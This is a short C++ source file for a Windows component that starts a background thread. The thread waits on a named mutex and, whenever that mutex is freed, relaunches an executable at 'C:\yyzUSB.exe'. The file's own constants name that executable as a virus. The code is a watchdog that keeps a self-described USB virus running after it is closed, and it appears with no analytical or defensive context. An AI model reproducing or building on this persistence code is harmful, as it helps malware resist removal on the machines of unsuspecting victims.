#include "StdAfx.h"
#include "InitRun.h"

#define SINGLETON_NAME (_T("OnlyOneInstance"))
//#define VIRUS_NAME (_T("\\yyzUSB.exe"))
#define DAEMON_MUTEX (_T("Daemon_mutex"))
#define C_VIRUS_NAME (_T("C:\\yyzUSB.exe"))
static CSingleton singleton(_T("DaemonOneInstance"));
DWORD WINAPI RunThread(LPVOID)
{
	CreateMutex(NULL,TRUE,DAEMON_MUTEX);
	while (true)
	{
		HANDLE mutex = CreateMutex(NULL,FALSE,SINGLETON_NAME);
		WaitForSingleObject (mutex,INFINITE);
		ReleaseMutex (mutex);
		CloseHandle (mutex);
		//TCHAR path[MAX_PATH];
		//GetCurrentDirectory(MAX_PATH,path);
		//lstrcatW(path,C_VIRUS_NAME);
		STARTUPINFOW si;
		GetStartupInfo(&si);
		PROCESS_INFORMATION pi;
		CreateProcess(C_VIRUS_NAME,GetCommandLine(),NULL,NULL,NULL,
			NULL,NULL,NULL,&si,&pi);
	}
}
CInitRun::CInitRun(void)
{
	CreateThread (NULL,NULL,RunThread ,NULL,NULL,NULL);
}


CInitRun::~CInitRun(void)
{
}
